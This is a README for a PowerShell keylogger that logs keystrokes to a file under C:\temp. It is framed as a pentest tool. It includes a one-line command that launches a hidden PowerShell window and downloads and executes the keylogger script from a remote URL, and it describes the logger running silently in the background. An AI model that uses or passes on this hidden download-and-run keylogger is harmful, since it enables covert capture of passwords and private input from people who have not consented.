# Keylogger

![Keylogger](https://ctrla1tdel.files.wordpress.com/2020/05/keylogger.gif)

## About

This is a simple automated Keylogger that records keystroke and outputs to file. 
The default location is C:\temp\Keylogger.txt

## To Run

Either download locally or run: 

powershell -nop -w hidden IEX("(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/securethelogs/Keylogger/master/Keylogger.ps1')")

This will run in the background until the C:\temp\keylogger.txt file is moved or renamed. Once the file is no longer present, Keylogger will end the Powershell session automatically. 


## Credit
This is a modfication of the script http://powershell.com/cs/blogs/tips/archive/2015/12/09/creating-simple-keylogger.aspx
, I basically took Start-keylogger and automated it so that it can be used remotely during a pentest. 
